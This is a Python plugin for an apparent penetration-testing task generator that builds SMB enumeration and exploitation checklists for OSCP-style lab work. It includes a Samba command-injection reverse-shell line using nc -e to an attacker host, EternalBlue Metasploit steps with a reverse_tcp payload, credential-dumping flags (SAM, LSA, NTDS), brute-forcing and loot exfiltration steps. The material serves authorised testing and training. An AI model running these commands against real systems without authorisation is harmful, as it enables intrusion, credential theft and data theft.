"""
SMB service enumeration plugin (EXPANDED)

Generates tasks for SMB/CIFS enumeration including:
- Share enumeration (smbclient, smbmap, crackmapexec)
- Null session testing
- User/SID enumeration (rpcclient, samrdump, lookupsid)
- Version-specific exploits (EternalBlue, SambaCry, etc.)
- Advanced RPC enumeration
- Share content discovery
- Default/hidden share testing
- Registry reading via SMB
- Credential brute-forcing
- Post-exploitation (Samba config analysis)

Extracted from HackTricks SMB pentesting guides
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class SMBPlugin(ServicePlugin):
    """SMB/CIFS enumeration plugin (EXPANDED)"""

    @property
    def name(self) -> str:
        return "smb"

    @property
    def default_ports(self) -> List[int]:
        return [139, 445]

    @property
    def service_names(self) -> List[str]:
        return ['smb', 'microsoft-ds', 'netbios-ssn', 'cifs', 'netbios-ns']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect SMB services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        if any(svc in service for svc in self.service_names):
            return True

        # SMB ports: 139 (NetBIOS), 445 (SMB), 137 (NetBIOS Name Service)
        if port in [137, 139, 445]:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SMB enumeration task tree"""
        version = service_info.get('version', '')

        tasks = {
            'id': f'smb-enum-{port}',
            'name': f'SMB Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # === QUICK WINS (Fast, High-Value) ===

        # 1. NetBIOS Name Service Enumeration (Port 137)
        if port == 137 or port == 139:
            tasks['children'].append({
                'id': f'netbios-enum-{port}',
                'name': 'NetBIOS Name Enumeration',
                'type': 'parent',
                'children': [
                    {
                        'id': f'nmblookup-{port}',
                        'name': 'nmblookup Enumeration',
                        'type': 'command',
                        'metadata': {
                            'command': f'nmblookup -A {target}',
                            'description': 'Query NetBIOS names and MAC address',
                            'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                            'flag_explanations': {
                                '-A': 'Lookup by IP address (instead of name)'
                            },
                            'success_indicators': [
                                'NetBIOS name table displayed',
                                'MAC address revealed',
                                'Workgroup/domain name discovered'
                            ],
                            'failure_indicators': [
                                'No reply from host',
                                'Timeout'
                            ],
                            'next_steps': [
                                'Identify server roles from NetBIOS suffixes',
                                'Note workgroup/domain name for enumeration',
                                'Proceed to SMB share enumeration'
                            ],
                            'alternatives': [
                                f'nbtscan {target}',
                                f'nmap -sU -sV --script nbstat.nse -p137 {target}'
                            ],
                            'notes': 'NetBIOS names reveal computer name, workgroup, and server roles (DC, fileserver, etc.)'
                        }
                    },
                    {
                        'id': f'nbtscan-{port}',
                        'name': 'nbtscan Network Scan',
                        'type': 'command',
                        'metadata': {
                            'command': f'nbtscan {target}',
                            'description': 'NetBIOS name service scanner (fast)',
                            'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                            'success_indicators': [
                                'NetBIOS names and services listed'
                            ],
                            'alternatives': [
                                f'nmblookup -A {target}',
                                f'nmap --script nbstat -p137 {target}'
                            ],
                            'notes': 'Faster than nmblookup for scanning multiple hosts'
                        }
                    }
                ]
            })

        # 2. Share enumeration
        tasks['children'].append({
            'id': f'smbclient-shares-{port}',
            'name': 'List SMB Shares',
            'type': 'command',
            'metadata': {
                'command': f'smbclient -L //{target} -N',
                'description': 'List shares using null session',
                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                'flag_explanations': {
                    '-L': 'List shares on target',
                    '-N': 'No password (null session attempt)'
                },
                'success_indicators': [
                    'Share list displayed',
                    'No NT_STATUS_ACCESS_DENIED'
                ],
                'failure_indicators': [
                    'NT_STATUS_ACCESS_DENIED: Null sessions disabled',
                    'Connection refused'
                ],
                'next_steps': [
                    'Connect to discovered shares: smbclient //{target}/<SHARE> -N',
                    'Download interesting files with: get, mget',
                    'Check for writable shares (potential upload point)'
                ],
                'alternatives': [
                    f'smbmap -H {target}',
                    f'crackmapexec smb {target} --shares'
                ]
            }
        })

        # 3. Comprehensive enumeration with enum4linux
        tasks['children'].append({
            'id': f'enum4linux-{port}',
            'name': 'Comprehensive SMB Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'enum4linux -a {target} > enum4linux_{port}.txt',
                'description': 'Full SMB enumeration (shares, users, groups, policies)',
                'tags': ['OSCP:HIGH', 'AUTOMATED'],
                'flag_explanations': {
                    '-a': 'Do all simple enumeration (shares, users, groups, etc.)'
                },
                'success_indicators': [
                    'User accounts enumerated',
                    'Password policy discovered',
                    'Group memberships listed'
                ],
                'notes': 'enum4linux is noisy - generates significant log entries. Use enum4linux-ng for improved output.'
            }
        })

        # 4. Null session testing
        tasks['children'].append({
            'id': f'rpcclient-null-{port}',
            'name': 'Test Null Session (RPC)',
            'type': 'command',
            'metadata': {
                'command': f'rpcclient -U "" -N {target}',
                'description': 'Test null session via RPC',
                'tags': ['MANUAL', 'OSCP:HIGH', 'QUICK_WIN'],
                'flag_explanations': {
                    '-U ""': 'Empty username',
                    '-N': 'No password'
                },
                'success_indicators': [
                    'rpcclient prompt appears (rpcclient $>)',
                    'No authentication error'
                ],
                'next_steps': [
                    'Try: enumdomusers (list domain users)',
                    'Try: enumdomgroups (list domain groups)',
                    'Try: queryuser <RID> (get user details)',
                    'Try: querygroupmem <RID> (get group members)',
                    'Try: netshareenumall (list shares)',
                    'Try: srvinfo (get server info)'
                ],
                'notes': 'If successful, try commands from rpcclient-enumeration section below'
            }
        })

        # === ADVANCED RPC ENUMERATION ===

        tasks['children'].append({
            'id': f'rpcclient-advanced-{port}',
            'name': 'Advanced RPC Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'rpcclient-users-{port}',
                    'name': 'Enumerate Users via RPC',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Manual RPC enumeration of users and SIDs',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''RPC Commands (connect first: rpcclient -U "" -N <target>):

User Enumeration:
  enumdomusers           - List all domain users
  querydispinfo          - Display user information (alternative)
  queryuser 0x<RID>      - Get detailed user info (RID in hex)
  queryusergroups 0x<RID> - Get user's group memberships
  lookupnames <username> - Get SID for username

SID/RID Enumeration:
  lookupsids <sid>       - RID cycling to enumerate users
  lsaenumsid            - Enumerate SIDs

Bash one-liner (RID brute-force 500-1100):
for i in $(seq 500 1100); do rpcclient -N -U "" <TARGET> -c "queryuser 0x$(printf '%x\\n' $i)" | grep "User Name\\|user_rid\\|group_rid" && echo ""; done

Group Enumeration:
  enumdomgroups         - List domain groups
  querygroup 0x<RID>    - Get group details
  querygroupmem 0x<RID> - Get group members
  enumalsgroups builtin - List built-in alias groups
  queryaliasmem builtin 0x<RID> - Get alias group members

Domain Info:
  querydominfo          - Get domain information
  lsaquery             - Get domain SID
  enumdomains          - List domains

Share Enumeration:
  netshareenumall       - List all shares
  netsharegetinfo <share> - Get share info

Server Info:
  srvinfo              - Get server information
'''
                    }
                },
                {
                    'id': f'samrdump-{port}',
                    'name': 'samrdump.py (Impacket)',
                    'type': 'command',
                    'metadata': {
                        'command': f'samrdump.py {target}',
                        'description': 'Dump user information via SAMR',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'flag_explanations': {
                            '-port': 'Specify port (139 or 445)'
                        },
                        'success_indicators': [
                            'User accounts dumped',
                            'RID/SID information retrieved'
                        ],
                        'alternatives': [
                            f'samrdump.py -port 445 {target}',
                            f'Manual RPC: rpcclient -U "" -N {target} → enumdomusers'
                        ],
                        'notes': 'SAMR (Security Account Manager Remote) protocol. Requires null session or valid creds.'
                    }
                },
                {
                    'id': f'lookupsid-{port}',
                    'name': 'lookupsid.py - SID Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': f'lookupsid.py -no-pass {target}',
                        'description': 'Enumerate local users via SID lookup',
                        'tags': ['OSCP:HIGH', 'AUTOMATED'],
                        'flag_explanations': {
                            '-no-pass': 'Use null session (no password)'
                        },
                        'success_indicators': [
                            'User list with SIDs',
                            'Group list with SIDs',
                            'Domain SID revealed'
                        ],
                        'failure_indicators': [
                            'Access denied',
                            'Null sessions disabled'
                        ],
                        'next_steps': [
                            'Use discovered usernames for password spraying',
                            'Note admin accounts for privilege escalation',
                            'Cross-reference with LDAP/Kerberos enumeration'
                        ],
                        'alternatives': [
                            'Manual: rpcclient -U "" -N <target> → lsaenumsid → lookupsids',
                            'Metasploit: auxiliary/scanner/smb/smb_lookupsid'
                        ],
                        'notes': 'Impacket tool. Works when null sessions allowed. Often reveals domain structure.'
                    }
                },
                {
                    'id': f'rpcdump-{port}',
                    'name': 'rpcdump.py - Enumerate RPC Endpoints',
                    'type': 'command',
                    'metadata': {
                        'command': f'rpcdump.py -port {port} {target}',
                        'description': 'Map RPC endpoints via MSRPC',
                        'tags': ['OSCP:MEDIUM'],
                        'flag_explanations': {
                            '-port': 'Target port (135, 139, or 445)'
                        },
                        'success_indicators': [
                            'RPC endpoints listed',
                            'UUID/interface information'
                        ],
                        'alternatives': [
                            f'rpcdump.py -port 135 {target}',
                            'nmap --script msrpc-enum'
                        ],
                        'notes': 'Maps named pipes and RPC services. Useful for identifying available attack surface.'
                    }
                }
            ]
        })

        # === DEFAULT/HIDDEN SHARE TESTING ===

        tasks['children'].append({
            'id': f'default-shares-{port}',
            'name': 'Test Default/Hidden Shares',
            'type': 'manual',
            'metadata': {
                'description': 'Manually test common Windows shares (C$, ADMIN$, IPC$, etc.)',
                'tags': ['OSCP:HIGH', 'MANUAL'],
                'notes': '''Common Windows Shares:
  C$         - System drive (admin only)
  D$         - D: drive (if exists)
  ADMIN$     - Windows directory (admin only)
  IPC$       - Inter-Process Communication (null session)
  PRINT$     - Printer drivers
  FAX$       - Fax sharing
  SYSVOL     - Group Policy/logon scripts (Domain Controllers)
  NETLOGON   - Logon scripts (Domain Controllers)

Test script (null session):
#!/bin/bash
ip='<TARGET>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[@]}; do
    output=$(smbclient -U '%' -N \\\\\\\\$ip\\\\$share -c '' 2>&1)
    if [[ -z $output ]]; then
        echo "[+] NULL session possible: $share"
    else
        echo $output | grep -q "NT_STATUS_ACCESS_DENIED" && echo "[-] Access denied: $share"
        echo $output | grep -q "NT_STATUS_BAD_NETWORK_NAME" && echo "[-] Does not exist: $share"
    fi
done

Manual connection:
  smbclient -U '%' -N \\\\<IP>\\<SHARE>    # Null session
  smbclient -U '<USER>' \\\\<IP>\\<SHARE>  # With credentials

Responses:
  NT_STATUS_ACCESS_DENIED    → Share exists, no access
  NT_STATUS_BAD_NETWORK_NAME → Share does not exist
  (empty/prompt)             → Success!

SYSVOL/NETLOGON Notes:
  - Readable by all domain users
  - May contain scripts with hardcoded passwords
  - Check .bat, .vbs, .ps1 files
  - Look for Registry.xml (Group Policy autologon passwords)
  - Test write access: smbclient \\\\<DC>\\SYSVOL -c 'put test.txt'
  - If writable → logon script poisoning possible!
'''
            }
        })

        # === SHARE CONTENT DISCOVERY ===

        tasks['children'].append({
            'id': f'share-content-{port}',
            'name': 'Share Content Discovery',
            'type': 'parent',
            'children': [
                {
                    'id': f'smbmap-recursive-{port}',
                    'name': 'Recursive Share Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': f'smbmap -H {target} -R --depth 5',
                        'description': 'Recursively list share contents',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'flag_explanations': {
                            '-H': 'Target hostname/IP',
                            '-R': 'Recursively list directories',
                            '--depth': 'Recursion depth (5 levels)'
                        },
                        'success_indicators': [
                            'Directory tree displayed',
                            'Files and folders enumerated'
                        ],
                        'alternatives': [
                            f'smbmap -u "username" -p "password" -H {target} -R',
                            'Manual: smbclient → recurse; ls'
                        ],
                        'notes': 'Look for: passwords.txt, backup files, config files, scripts'
                    }
                },
                {
                    'id': f'smbclient-download-{port}',
                    'name': 'Bulk File Download',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Download all files from accessible shares',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''smbclient Bulk Download:

Connect to share:
  smbclient //<TARGET>/<SHARE> -N  # Null session
  smbclient -U "user%pass" //<TARGET>/<SHARE>

Download all files:
  smb: \\> mask ""      # Match all files
  smb: \\> recurse      # Enable recursion
  smb: \\> prompt       # Disable prompts
  smb: \\> mget *       # Download everything

Search and download specific files:
  smbmap -R <FOLDER> -H <IP> -A <FILENAME> -q
  # Downloads to /usr/share/smbmap/

Mount share (Linux):
  mount -t cifs //<IP>/<SHARE> /mnt/share
  mount -t cifs -o "username=user,password=pass" //<IP>/<SHARE> /mnt/share

Files to prioritize:
  - *.config, web.config (credentials)
  - Registry.xml (Group Policy passwords)
  - *.bat, *.ps1 (scripts with hardcoded creds)
  - backup.*, *.bak (backups)
  - passwords.*, creds.* (password files)
  - id_rsa, *.pem (SSH keys)
'''
                    }
                },
                {
                    'id': f'crackmapexec-spider-{port}',
                    'name': 'CrackMapExec Spider Module',
                    'type': 'command',
                    'metadata': {
                        'command': f'crackmapexec smb {target} -u "" -p "" -M spider_plus',
                        'description': 'Crawl shares and index files',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'flag_explanations': {
                            '-M spider_plus': 'Spider Plus module (indexes files)',
                            '--share': 'Specify single share (optional)',
                            '--pattern': 'File pattern filter (e.g., txt, config)'
                        },
                        'success_indicators': [
                            'Share contents indexed',
                            'JSON output generated'
                        ],
                        'alternatives': [
                            f'crackmapexec smb {target} -u user -p pass -M spider_plus --share "Share Name"',
                            f'crackmapexec smb {target} -M spider_plus --pattern config'
                        ],
                        'notes': 'Creates JSON index of all share contents. Useful for finding sensitive files across large shares.'
                    }
                }
            ]
        })

        # === CREDENTIAL-BASED ENUMERATION ===

        tasks['children'].append({
            'id': f'authenticated-enum-{port}',
            'name': 'Authenticated SMB Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'crackmapexec-enum-{port}',
                    'name': 'CrackMapExec Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Comprehensive enumeration with valid credentials',
                        'tags': ['OSCP:HIGH', 'REQUIRES_AUTH'],
                        'notes': '''CrackMapExec with Credentials:

Basic authentication:
  crackmapexec smb <IP> -u <USER> -p <PASS>
  crackmapexec smb <IP> -u <USER> -H <NTHASH>  # Pass-the-Hash

Enumeration:
  --users              # Enumerate domain users
  --groups             # Enumerate domain groups
  --local-groups       # Enumerate local groups
  --loggedon-users     # Get logged-on users
  --sessions           # Get active sessions
  --disks              # Enumerate disks
  --shares             # List shares with permissions
  --pass-pol           # Get password policy
  --rid-brute          # RID cycling (500-4000)

Credential dumping:
  --sam                # Dump SAM database
  --lsa                # Dump LSA secrets
  --ntds               # Dump NTDS.dit (Domain Controller)

Command execution:
  -x "whoami"          # Execute CMD command
  -X "$PSVersionTable" # Execute PowerShell

Examples:
  crackmapexec smb <IP> -u admin -p pass --shares
  crackmapexec smb <IP> -u admin -p pass --users --groups
  crackmapexec smb <IP> -u admin -H <HASH> --sam
'''
                    }
                },
                {
                    'id': f'reg-read-{port}',
                    'name': 'Read Registry via SMB',
                    'type': 'command',
                    'metadata': {
                        'command': f'reg.py DOMAIN/USER@{target} -hashes :<NTHASH> query -keyName HKLM -s',
                        'description': 'Read Windows registry remotely via SMB',
                        'tags': ['OSCP:MEDIUM', 'REQUIRES_AUTH'],
                        'flag_explanations': {
                            'query': 'Query registry key',
                            '-keyName': 'Registry hive (HKLM, HKCU, HKU)',
                            '-s': 'Recursive search'
                        },
                        'success_indicators': [
                            'Registry keys/values displayed',
                            'Sensitive data extracted'
                        ],
                        'alternatives': [
                            'reg.py DOMAIN/USER:PASS@<IP> query -keyName HKCU',
                            'Manual: rpcclient → reg* commands'
                        ],
                        'notes': '''Impacket reg.py - Remote registry access.
Requires: Valid credentials and RemoteRegistry service enabled.
Hives: HKLM (system), HKCU (user), HKU (all users).
Look for: stored credentials, installed software, services, autologon passwords.'''
                    }
                }
            ]
        })

        # === VERSION-SPECIFIC VULNERABILITY CHECKS ===

        tasks['children'].append({
            'id': f'smb-vulns-{port}',
            'name': 'SMB Vulnerability Scan',
            'type': 'command',
            'metadata': {
                'command': f'nmap --script smb-vuln-* -p{port} {target} -oN smb_vulns_{port}.txt',
                'description': 'Check for SMB vulnerabilities (EternalBlue, MS08-067, etc.)',
                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                'flag_explanations': {
                    '--script smb-vuln-*': 'Run all SMB vulnerability NSE scripts',
                    '-oN': 'Output to normal file'
                },
                'success_indicators': [
                    'VULNERABLE: MS17-010 (EternalBlue)',
                    'VULNERABLE: MS08-067',
                    'VULNERABLE: CVE-2017-7494 (SambaCry)',
                    'VULNERABLE: CVE-2009-3103',
                    'VULNERABLE: MS06-025',
                    'VULNERABLE: MS07-029'
                ],
                'failure_indicators': [
                    'No vulnerabilities detected',
                    'Script timed out'
                ],
                'next_steps': [
                    'Research exploit code for detected vulnerabilities',
                    'Verify with Metasploit auxiliary modules',
                    'Check searchsploit for PoCs',
                    'Test manual exploitation'
                ],
                'alternatives': [
                    f'nmap -p{port} --script smb-vuln-ms17-010 {target}  # EternalBlue only',
                    f'nmap -p{port} --script smb-vuln-ms08-067 {target}  # MS08-067 only',
                    'Metasploit: auxiliary/scanner/smb/smb_ms17_010'
                ],
                'notes': 'EternalBlue (MS17-010) is common in lab environments. SambaCry (CVE-2017-7494) affects Samba 3.5.0-4.6.4.'
            }
        })

        # === CREDENTIAL BRUTE-FORCING ===

        tasks['children'].append({
            'id': f'smb-bruteforce-{port}',
            'name': 'SMB Credential Brute-Force',
            'type': 'parent',
            'children': [
                {
                    'id': f'nmap-brute-{port}',
                    'name': 'Nmap SMB Brute-Force',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap --script smb-brute -p{port} {target}',
                        'description': 'Brute-force SMB credentials (SLOW, NOISY)',
                        'tags': ['OSCP:LOW', 'BRUTE_FORCE', 'NOISY'],
                        'success_indicators': [
                            'Valid credentials found',
                            'Account lockout warnings'
                        ],
                        'failure_indicators': [
                            'Account locked out',
                            'No valid credentials'
                        ],
                        'notes': 'WARNING: High risk of account lockout. Check password policy first. Not recommended for OSCP exam.'
                    }
                },
                {
                    'id': f'hydra-smb-{port}',
                    'name': 'Hydra SMB Brute-Force',
                    'type': 'command',
                    'metadata': {
                        'command': f'hydra -l <USER> -P /usr/share/wordlists/rockyou.txt {target} smb',
                        'description': 'Brute-force SMB with Hydra (SLOW, NOISY)',
                        'tags': ['OSCP:LOW', 'BRUTE_FORCE', 'NOISY'],
                        'flag_explanations': {
                            '-l': 'Username',
                            '-P': 'Password wordlist',
                            '-t': 'Number of parallel tasks (default: 16)'
                        },
                        'notes': 'WARNING: Account lockout risk. Use small wordlist and low thread count (-t 1). Password spraying preferred.'
                    }
                }
            ]
        })

        # === POST-EXPLOITATION ===

        tasks['children'].append({
            'id': f'smb-post-exploit-{port}',
            'name': 'SMB Post-Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Post-exploitation tasks after SMB access gained',
                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT'],
                'notes': '''SMB Post-Exploitation:

Samba Server Configuration (Linux):
  Location: /etc/samba/smb.conf

  Dangerous Settings:
    browseable = yes           # Allow share listing
    read only = no             # Allow writes
    writable = yes             # Allow file creation
    guest ok = yes             # No password required
    enable privileges = yes    # Honor SID privileges
    create mask = 0777         # Permissive file permissions
    directory mask = 0777      # Permissive directory permissions
    logon script = script.sh   # Executed on user logon
    magic script = script.sh   # Executed when file closed
    magic output = script.out  # Output location

Server Status:
  smbstatus                    # Show connected users and shares
  smbstatus -S                 # Show shares only
  smbstatus -p                 # Show processes

Privilege Escalation Vectors:
  1. Writable shares → upload malicious files
  2. Logon scripts → inject code (SYSVOL poisoning)
  3. Magic scripts → code execution on file close
  4. Weak permissions → modify existing scripts
  5. Credential theft → extract from config/scripts

Data Exfiltration:
  1. Mount share: mount -t cifs //<IP>/<SHARE> /mnt
  2. Download all: smbclient → mask ""; recurse; mget *
  3. Search sensitive: grep -r "password" /mnt/
  4. Compress: tar -czf loot.tar.gz /mnt/*

Windows Enumeration (from compromised host):
  PowerShell:
    Get-SmbShare              # List local shares
    Get-SmbConnection         # Show SMB connections
    Get-WmiObject Win32_Share # Alternative share listing

  CMD:
    net share                 # List local shares
    net view \\\\<IP> /all    # Remote shares (including hidden)

  MMC:
    fsmgmt.msc                # Shared Folders snap-in
    compmgmt.msc              # Computer Management

Lateral Movement:
  - See lateral_movement.py plugin for PsExec/WmiExec/SMBExec
  - Pass-the-Hash with crackmapexec/Impacket
  - Kerberos authentication with -k flag
'''
            }
        })

        # === EXPLOIT RESEARCH ===

        if version:
            tasks['children'].append({
                'id': f'exploit-research-smb-{port}',
                'name': f'Exploit Research: {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-smb-{port}',
                        'name': f'SearchSploit: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit {version}',
                            'description': 'Search for SMB exploits',
                            'tags': ['OSCP:HIGH', 'RESEARCH']
                        }
                    },
                    {
                        'id': f'msf-search-{port}',
                        'name': 'Metasploit Module Search',
                        'type': 'command',
                        'metadata': {
                            'command': 'msfconsole -q -x "search type:exploit platform:windows smb; exit"',
                            'description': 'Search Metasploit for SMB exploits',
                            'tags': ['OSCP:HIGH', 'RESEARCH']
                        }
                    }
                ]
            })

            # Check for specific vulnerable versions
            if 'samba 3.0.20' in version.lower():
                tasks['children'].append({
                    'id': f'samba-usermap-{port}',
                    'name': 'Samba 3.0.20 Username Map Script Exploit',
                    'type': 'manual',
                    'metadata': {
                        'description': 'CVE-2007-2447 - Command injection in username',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
                        'notes': '''CVE-2007-2447: Samba 3.0.20 Command Injection

Vulnerability: Username map script command injection
Metasploit: exploit/multi/samba/usermap_script

Manual exploitation:
  smbclient //<IP>/tmp -U "/=`nohup nc -e /bin/sh <LHOST> <LPORT>`"

Impact: Remote code execution as root (typically)
'''
                    }
                })

            if 'samba 3' in version.lower() or 'samba 4' in version.lower():
                # Check SambaCry range
                if any(x in version.lower() for x in ['3.5.', '3.6.', '4.0.', '4.1.', '4.2.', '4.3.', '4.4.', '4.5.', '4.6.']):
                    tasks['children'].append({
                        'id': f'sambacry-{port}',
                        'name': 'SambaCry (CVE-2017-7494) Exploit',
                        'type': 'manual',
                        'metadata': {
                            'description': 'Samba 3.5.0-4.6.4 Remote Code Execution',
                            'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE'],
                            'notes': '''CVE-2017-7494: SambaCry

Vulnerable: Samba 3.5.0 - 4.6.4
Metasploit: exploit/linux/samba/is_known_pipename

Requirements:
  - Writable share
  - Knowledge of share path on server

Manual exploitation: https://github.com/opsxcq/exploit-CVE-2017-7494

Impact: Remote code execution as smbd user
'''
                        }
                    })

        return tasks

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        """Parse results and spawn additional tasks"""
        new_tasks = []

        # If shares found, add tasks to connect to each
        if 'smbclient-shares' in task_id and 'Sharename' in result:
            port = task_id.split('-')[-1]
            new_tasks.append({
                'id': f'explore-shares-{port}',
                'name': 'Connect to and Explore Shares',
                'type': 'manual',
                'metadata': {
                    'description': 'Connect to each discovered share and explore contents',
                    'tags': ['MANUAL', 'OSCP:HIGH'],
                    'notes': 'For each share: smbclient //{target}/<SHARE> -N, then: ls, cd, get'
                }
            })

        # If vulnerable to EternalBlue
        if 'smb-vulns' in task_id and 'MS17-010' in result:
            port = task_id.split('-')[-1]
            new_tasks.append({
                'id': f'eternalblue-exploit-{port}',
                'name': 'Exploit EternalBlue (MS17-010)',
                'type': 'manual',
                'metadata': {
                    'description': 'Windows SMB Remote Code Execution',
                    'tags': ['EXPLOIT', 'OSCP:HIGH', 'RCE'],
                    'notes': '''EternalBlue Exploitation:

Metasploit:
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS <TARGET>
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST <LHOST>
  exploit

Manual (Python):
  https://github.com/worawit/MS17-010

Payload considerations:
  - Often requires payload tuning for stability
  - Try different payloads if exploit succeeds but no shell
  - Stageless payloads more reliable
  - Check target architecture (x86 vs x64)

Verification:
  nmap --script smb-vuln-ms17-010 -p445 <TARGET>
  Metasploit: auxiliary/scanner/smb/smb_ms17_010
'''
                }
            })

        # If vulnerable to MS08-067
        if 'smb-vulns' in task_id and 'MS08-067' in result:
            port = task_id.split('-')[-1]
            new_tasks.append({
                'id': f'ms08-067-exploit-{port}',
                'name': 'Exploit MS08-067 (Conficker)',
                'type': 'manual',
                'metadata': {
                    'description': 'Windows Server Service RPC Handling RCE',
                    'tags': ['EXPLOIT', 'OSCP:HIGH', 'RCE'],
                    'notes': 'Metasploit: exploit/windows/smb/ms08_067_netapi. Affects Windows XP, Server 2003, Vista, Server 2008.'
                }
            })

        return new_tasks

    def get_manual_alternatives(self, task_id: str) -> List[str]:
        """Get manual alternatives for SMB enumeration"""
        alternatives = {
            'smbclient': [
                'smbmap -H <target>',
                'crackmapexec smb <target> --shares',
                'Manual: net view \\\\<target> /all (from Windows)'
            ],
            'enum4linux': [
                'enum4linux-ng -A <target>  # Improved version',
                'Manual RPC: rpcclient -U "" -N <target>',
                'Then: enumdomusers, queryuser <RID>, enumdomgroups',
                'LDAP enumeration: ldapsearch (if port 389 open)'
            ],
            'nmap-vuln': [
                'Metasploit auxiliary modules: auxiliary/scanner/smb/*',
                'Manual version comparison against CVE databases',
                'Check: https://www.cvedetails.com/product/1117/Microsoft-Windows.html'
            ],
            'netbios': [
                'nmblookup -A <target>',
                'nbtscan <target>',
                'nmap -sU --script nbstat -p137 <target>'
            ]
        }

        for key, cmds in alternatives.items():
            if key in task_id:
                return cmds

        return []
